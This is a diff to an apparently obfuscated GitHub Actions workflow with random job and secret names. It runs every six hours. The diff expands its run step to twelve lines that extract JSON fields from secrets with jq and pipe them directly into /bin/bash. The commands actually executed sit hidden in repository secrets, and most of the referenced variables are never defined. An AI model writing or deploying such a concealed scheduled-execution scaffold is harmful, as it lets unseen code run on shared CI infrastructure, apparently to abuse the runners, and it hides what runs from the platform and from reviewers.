@@ -1,8 +1,9 @@
 name: gaoguifeng6473
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 1/6 * * *'
+    - cron: '36 1/6 * * *'
 
 jobs:
   build:
@@ -11,11 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: gaoguifeng6473
         env:
-          cgsk54: ${{ secrets.cgsk54 }}
+          fdnpf7: ${{ secrets.fdnpf7 }}
         run: |
-          echo $cgsk54 | jq -r .i82576 | /bin/bash
-          echo $gud73060 | jq -r .vnjnf3 | /bin/bash
-          echo $vk01 | jq -r .efzpo9 | /bin/bash
-          echo $rx87339 | jq -r .c54634 | /bin/bash
-          echo $gj0798 | jq -r .thvqk1441 | /bin/bash
+          echo $fdnpf7 | jq -r .msjtx03493 | /bin/bash
+          echo $tppb64 | jq -r .ldik81518 | /bin/bash
+          echo $flp994 | jq -r .rp67673 | /bin/bash
+          echo $uj9 | jq -r .fcom5093 | /bin/bash
+          echo $hem9171 | jq -r .g2953 | /bin/bash
+          echo $i5 | jq -r .jwwkc22546 | /bin/bash
+          echo $u35 | jq -r .loex116 | /bin/bash
+          echo $scgyk334 | jq -r .uhx96136 | /bin/bash
+          echo $t79 | jq -r .vg8572 | /bin/bash
+          echo $k03148 | jq -r .z97754 | /bin/bash
+          echo $c3 | jq -r .ypm3 | /bin/bash
+          echo $u987 | jq -r .qof51724 | /bin/bash
 
